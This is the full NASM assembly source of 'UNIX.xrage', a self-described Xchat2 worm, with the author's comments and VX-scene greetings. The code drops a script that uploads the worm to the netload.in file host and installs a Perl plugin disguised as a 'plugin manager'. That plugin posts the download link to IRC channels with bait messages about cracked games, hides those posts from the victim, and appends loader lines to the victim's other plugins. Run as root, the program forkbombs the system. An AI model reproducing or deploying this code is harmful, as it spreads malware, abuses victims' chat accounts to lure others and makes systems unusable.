; UNIX.xrage 32bit Xchat2 worm
; 
; This is my first creation in nASM which uses still some dirty hacks
; but with time there comes more skill ;)
;
; UNIX.xrage checks if xchat2 and curl is installed. Then it drops a
; Bash script which uploads the worm to netload.in
; Now a Perl Plugin is droped to the autoload directory of xchat2. This
; Plugin now sends every 5 Minutes a random Message with the netload.in
; link to the channel. The victim can't see that he is spreading links
; because the plugin uses some Xchat2 API Foo :D
; The Plugin checks for other perl plugins in the autoload directory and
; infects them.
;
; If the virus is executed as root, the payload is an oldschool forkbomb
;
; You should rly check out the Xchat2 API. It's a heaven for VX :D
;
;
; Greetings to: SPTH, WarGame, alcopaul,herm1t, zer0p, R3s1stanc3, skier
; Greetings to: All the dudes from #virus and #vxnet <3
;
;
; Coded by Perforin [vxnetw0rk]

section .data

%defstr home %!HOME                                 ; $ENV{'HOME'}
%defstr home_env HOME=%!HOME                        ; HOME=$ENV{'HOME'}

HOME:            db home,0                          ; Store $ENV{'HOME'}
HOME_ENV:        db home_env,0                      ; Store HOME=$ENV{'HOME'}

shell:           db "/bin/sh",0                     ; our path the the shell
argv:            dd shell, script2name, 0           ; argument array for sys_execv
endv:            dd HOME_ENV,0                      ; environment array for sys_execv

xchat:           db "/usr/bin/xchat",0              ; path to xchat
curl:            db "/usr/bin/curl",0               ; path to curl

; This is the bash script which will upload the virus to netload.in

script:          db '#!/bin/sh',10,'AUTHCODE="jJk7pHDhVKIF2gZ6tRZ8VCpaTWCWaTra"',10
                 db 'SERVER=`curl -s http://api.netload.in/getserver.php`',10
                 db 'if [ "x$SERVER" = "x" ]; then',10,'exit 3',10,'fi',10
                 db 'PARAMETERS="-F auth=$AUTHCODE -F modus=file_upload"',10
                 db 'PARAMETERS="$PARAMETERS -F file_link=@$1"',10
                 db 'RESULT=`curl -s $PARAMETERS $SERVER`',10
                 db 'RESULT_CODE=`echo "$RESULT"|awk -F ',"';' '{print $1}'`",10
                 db 'RESULT_URL=`echo "$RESULT"|awk -F ',"';' '{print $4}'`",10
                 db 'if [ "x$RESULT_CODE" = "xprepare_failed" ]; then',10,'exit 6',10
                 db 'fi',10,'if [ "x$RESULT_CODE" = "xUPLOAD_OK" ]; then',10
                 db 'echo $RESULT_URL > $HOME/.xchat2/scrollback/url.txt',10,'fi',10
                 db 'exit 100',10
scriptLEN:       equ $-script                       ; length of the script
scriptname:      db 'netload.sh',0                  ; captn obvious here

; This is the dirty-work-script. Copys the virus to its destination and destroys itself

script2:         db '#!/bin/sh',10,"cp UNIX.xrage $HOME/.xchat2/scrollback/UNIX.xrage",10
                 db 'rm hackaround_UNIX.xrage.sh',10
script2LEN:      equ $-script2                          ; length of the script
script2name:     db 'hackaround_UNIX.xrage.sh',0        ; captn obvious strikes again!

; This is the actual Xchat2 Perl Plugin which does the spreading

plugin:          db '#!/usr/bin/perl',10,"$version = '0.1';",10
                 db 'Xchat::register("Xchat2 plugin manager", $version,"Responsible for',
                 db ' loading and initialising Xchat2 plugins");',10
                 db "$xchatdir_vir = Xchat::get_info('xchatdir');",10
                 db '$exec_vir = `sh $xchatdir_vir/scrollback/netload.sh $xchatdir_vir/scrollback/UNIX.xrage &`;',10
                 db '@sentences_vir = ("Hey look at this new cracked minecraft server!",',10
                 db ' "Newest AIMbot for counterstrike is out now! :D", "This tool is amazing!", "Ok I am honest.',10
                 db ' I got infected with UNIX.xrage by Perforin [vxnetw0rk]");',10,10
                 db "Xchat::hook_print('Your Message',\&hideme);",10,"Xchat::hook_timer(300000, \&spread);",10,10
                 db 'sub hideme {',10,'$msg = $_[0][1];',10,'return Xchat::EAT_XCHAT if $msg =~ /netload.in/i;',10,'}',10
                 db 'sub spread {',10,'open url, "<", "$xchatdir_vir/scrollback/url.txt" || die "Please reload Xchat!";',10
                 db 'chomp ($payload_url = <url>);',10,'close url;',10,'$randomize_payload = $sentences_vir[int(rand(4))];',10
                 db 'Xchat::command("say $randomize_payload $payload_url");',10,'}',10,10
                 db '@modules_av = glob "$xchatdir_vir/*.pl";',10,'foreach $module_av (@modules_av) {',10
                 db 'open mod,"<", $module_av;',10,'while (<mod>) {',10,'$infected = 1 and next if $_ =~ /^\# UNIX.xrage$/;',10
                 db '}',10,'push @not_infected, $module_av unless $infected;',10,'undef $infected;',10,'close mod;',10,'}',10
                 db 'foreach $not_infected_yet (@not_infected) {',10,'open mod, ">>", $not_infected_yet;',10
                 db "print mod 'Xchat::command(",'"load ',"' . $xchatdir_vir . '/xchat_PM.pl",'");',"';",10
                 db 'print mod "\# UNIX.xrage\n";',10,'close mod;',10,'}',10,'# UNIX.xrage',10

pluginLEN:       equ $-plugin                           ; length of the script
pluginname:      db 'xchat_PM.pl',0                     ; some lame SE here PM stands for "Plugin Manager"

newname:         db 'UNIX.xrage',0                      ; part of the payload is that virus renames itself

root_payload:    db "Forkbomb bitches! :)",10           ; Those who are dumb enough to start the virus as root
root_payloadLEN: equ $-root_payload                     ; will see this string

xchat_path:      db '.xchat2/scrollback/',0             ; This is the directory which will store our virus
oneless:         db '../',0                             ; --> cd ..

section .text

global _start

_start:

mov eax,5                           ; sys_open
mov ebx, xchat                      ; opening xchat 
mov ecx,0                           ; O_RDONLY
int 80H                             ; call the kernel

test eax,eax                        ; test if xchat exists
js Exit                             ; no? you lucky bastard!

mov eax,5                           ; sys_open
mov ebx, curl                       ; opening curl  
mov ecx,0                           ; O_RDONLY
int 80H                             

test eax,eax                        ; test if curl exists
js Exit                             ; no? you lucky bastard!

payload:

    mov eax, 38                     ; sys_rename
    mov ebx, [esp+4]                ; get the filename of the stack!
    mov ecx, newname                ; part of the payload :)
    int 80H

    mov eax,8                       ; sys_creat
    mov ebx, script2name            ; drops "hackaround_UNIX.xrage.sh"
    mov ecx,00755Q                  ; -rwxr-xr-x in octal
    int 80H                         ; File descriptor in eax
                                    
    test eax,eax                    ; Is the file descriptor valid?
    js Exit                         ; No? Something went wrong!
                                
    mov ebx,eax                     ; move file descriptor to ebx
    mov eax,4                       ; sys_write
    mov ecx,script2                 ; Content of script2
    mov edx,script2LEN              ; length of script2
    int 80H

    mov eax, 24                     ; sys_getuid
    int 80H                         

    cmp eax, 0                      ; compare with 0 (0 == root)

    je GotRoot                      ; jmp if eax is equal to 0
    ja NotRoot                      ; jmp if eax is above to 0
    

GotRoot:

    mov eax, 4                      ; sys_write
    mov ebx, 1                      ; STDOUT
    mov ecx, root_payload           ; payload message :)
    mov edx, root_payloadLEN        
    int 80H                         

    mov eax,2                       ; sys_fork
    int 80H                         ; FORKBOMB TIME BITCHES
    jmp GotRoot                     ; loop


NotRoot:

    mov eax,2                       ; sys_fork
    int 80H                         
    
    test eax,eax
    jz Execute                      ; Child executes script
    

    mov eax, 12                     ; sys_chdir
    mov ebx, HOME                   
    int 80H

    mov eax, 12                     ; sys_chdir
    mov ebx, xchat_path
    int 80H


    mov eax,8                       ; sys_creat
    mov ebx, scriptname
    mov ecx,00644Q                  ; -rw-r--r-- in octal
    int 80H                         ; Call the kernel
                                    ; Now we have a file descriptor in eax

    test eax,eax                    ; checking file descriptor...       
    js Exit                         ; something went wrong!
    
    mov ebx,eax                     
    mov eax,4                       ; sys_write
    mov ecx,script                  ; script content
    mov edx,scriptLEN               ; length of the script content
    int 80H

    mov eax, 12                     ; sys_chdir
    mov ebx, oneless                ; cd ../
    int 80H
    

    mov eax,8                       ; sys_creat
    mov ebx, pluginname
    mov ecx,00644Q                  ; -rw-r--r-- in octal
    int 80H                         

    test eax,eax                    ; checking file descriptor...
    js Exit                         ; something went wrong!

    mov ebx,eax             
    mov eax,4                       ; sys_write
    mov ecx,plugin                  ; the actual xchat plugin drops now
    mov edx,pluginLEN
    int 80H
    
    jmp Exit

Execute:

    mov eax, 11                     ; sys_execv
    mov ebx, shell
    mov ecx, argv                   ; execute our dirty-work-script
    mov edx, endv
    int 80H
    
Exit:

    mov eax, 1                      ; the end   
    mov ebx, 0                      ; my        
    int 80H                         ; friend
